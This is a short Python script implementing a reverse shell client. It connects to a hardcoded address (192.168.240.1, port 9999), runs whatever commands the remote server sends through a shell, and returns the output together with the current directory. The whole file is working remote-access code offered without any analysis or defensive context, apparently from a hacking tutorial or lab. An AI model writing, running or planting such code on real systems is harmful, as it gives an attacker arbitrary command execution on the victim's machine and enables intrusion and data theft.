import socket
import os
import subprocess


s = socket.socket()
host = "192.168.240.1"
port = 9999

s.connect((host, port))

while True:

    data = s.recv(1024) #receive server command
    if data[:2].decode("utf-8") == 'cd': # If the command is $(cd something) then just change the directory and send nothing
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0: #Other non zero length command
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE) #Process the commands
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")  # Convert the output in string format
        currentWD = os.getcwd() + ">" # Get the current working directory of client
        s.send(str.encode(output_str + currentWD)) #send to server
        print(output_str)
